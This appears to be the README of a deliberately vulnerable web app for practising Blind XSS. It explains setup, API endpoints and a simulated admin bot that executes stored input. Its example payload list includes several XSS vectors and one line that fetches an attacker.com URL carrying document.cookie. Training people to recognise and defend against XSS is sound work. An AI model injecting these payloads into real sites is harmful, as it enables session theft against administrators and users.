# Blind XSS Practice Lab

This project is a deliberately vulnerable web application designed to help security learners practice Blind Cross-Site Scripting (XSS) in a controlled and safe environment. It provides realistic scenarios without exposing real systems to risk.

## Security Warning

The application contains intentional security flaws. It should only be used in isolated environments meant for testing or learning. Do not deploy it to production systems or make it publicly accessible.

## What Is Blind XSS?

Blind XSS occurs when a malicious payload is stored and later executed in a different context, typically within administrative tools, background tasks, or systems that process user-provided data. Unlike traditional XSS, the attacker does not see the impact immediately. The results become visible only when a privileged user or automated process interacts with the stored payload.

## Features

* Multiple vulnerable inputs to experiment with payload injection
* A simulated administrative bot that automatically reviews and executes stored data
* Real-time visibility into detected payload activity
* A minimal administrative dashboard for reviewing flagged reports
* Clear explanations and behavior designed for educational use

## Technologies Used

* Next.js (Pages Router)
* Node.js
* In-memory data storage
* Background polling bot

## Quick Start

### Prerequisites

* Node.js 18 or later
* npm 9 or later (or a compatible alternative)

### Installation

1. Clone the repository or navigate to your local project copy.
2. Install required dependencies:

   ```bash
   npm install
   ```

### Running the Application

Start the development server and enable the bot:

```bash
npm run dev
```

The application will run on `http://localhost:3000`, unless that port is unavailable.
The bot begins polling automatically.

### Optional: Production Build

```bash
npm run build && npm start
```

## Working With Blind XSS

### Method 1: Direct Payload Submission

1. Open the main application page.
2. Submit an XSS payload such as `<img src=x onerror=alert('XSS')>`.
3. The bot checks for new reports every few seconds.
4. When the bot processes your submission, the payload executes.

### Method 2: Contact Form Injection

1. Submit the contact form on the main page.
2. The server stores your browser’s User-Agent.
3. If the User-Agent contains scriptable content, it may be executed by the bot.

### Method 3: API-Based Submission

```bash
curl -X POST http://localhost:3000/api/reports \
  -H 'Content-Type: application/json' \
  -d '{"userAgent":"<img src=x onerror=alert(1)>"}'
```

## Available Endpoints

### Application

* `GET /` — Main application interface

### API

* `GET /api/reports` — Retrieve stored reports
* `POST /api/reports` — Submit a new report
* `GET /api/comments` — View comments
* `POST /api/comments` — Submit a comment
* `POST /api/contact` — Contact form submission with User-Agent capture
* `GET /api/xss-payloads` — View collected payloads
* `GET /api/bot` — Manually trigger a bot scan
* `GET | POST /api/collect-xss` — Logging endpoint returning a 1×1 GIF
* `GET /admin` — Dashboard showing flagged payloads and detection rules

## Bot Behavior

The simulated bot runs continuously and performs the following every three seconds:

1. Calls `/api/bot` to check for new data
2. Reviews recent reports (within the last five minutes)
3. Flags items matching XSS-like patterns
4. Attaches severity ratings and reasons for detection

The dashboard at `/admin` displays flagged entries and refreshes automatically.

## Example Payloads

Use these for testing only:

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<a href="javascript:alert('XSS')">Click me</a>
<svg onload=alert('XSS')>
<div onmouseover=alert('XSS')>Hover over me</div>
<img src=x onerror=fetch('http://attacker.com/log?cookie=' + document.cookie)>
```

## Configuration

Several environment variables allow customization:

* `BOT_URL` — Bot polling target (default: `http://localhost:3000/api/bot`)
* `BOT_INTERVAL_MS` — Polling interval (default: 3000)
* `PORT` — Server port (default: 3000)

Example:

```bash
BOT_INTERVAL_MS=5000 npm run dev
```

## Troubleshooting

### Port Conflicts

Use a different port:

```bash
PORT=3001 npm run dev
```

### Payload Not Firing

* Ensure the payload is valid and executable.
* Some browsers may block certain patterns.
* Verify that the bot is running.

### Lost Data

The application stores all data in memory only. A server restart clears all information.

### Bot Errors

Occasional bot errors can occur but generally do not affect normal operation.

## Learning Objectives

This project is intended to help users understand:

* How Blind XSS works in real-world systems
* Techniques for crafting and identifying XSS payloads
* How blind injection points can be abused
* Why input validation and output encoding are essential
* How administrative panels become targets for persistent attacks

## Credits

Adapted from the original BlindXSS-Lab by 3xecutablefile.
